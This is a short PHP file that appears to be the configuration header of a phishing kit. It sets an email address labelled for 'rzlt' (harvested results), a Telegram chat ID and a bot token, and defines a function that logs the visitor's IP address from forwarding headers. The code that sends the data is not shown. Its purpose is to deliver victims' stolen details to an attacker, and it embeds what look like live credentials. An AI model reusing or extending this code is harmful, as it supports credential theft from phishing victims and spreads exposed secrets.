<?php
$my_mail = "michelcreel@gmail.com";   // Your E-Mail rzlt
$chat_id ="1065378779";
   $bot_token ="1388902959:AAG_TgVwvqyfJXHYVDWU1-7bcq1QHADX19M";
function _ip() {
            $ipaddress = '';
            if(getenv('HTTP_CLIENT_IP')){
                $ipaddress = getenv('HTTP_CLIENT_IP');
            }
            elseif(getenv('HTTP_X_FORWARDED_FOR')){
                $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
            }
            elseif(getenv('HTTP_X_FORWARDED')){
                $ipaddress = getenv('HTTP_X_FORWARDED');
            }
            elseif(getenv('HTTP_FORWARDED_FOR')){
                $ipaddress = getenv('HTTP_FORWARDED_FOR');
            }
            elseif(getenv('HTTP_FORWARDED')){
               $ipaddress = getenv('HTTP_FORWARDED');
            }
            elseif(getenv('REMOTE_ADDR')){
                $ipaddress = getenv('REMOTE_ADDR');
            }
            else{
                $ipaddress = 'UNKNOWN';
            }
            return $ipaddress;
        }
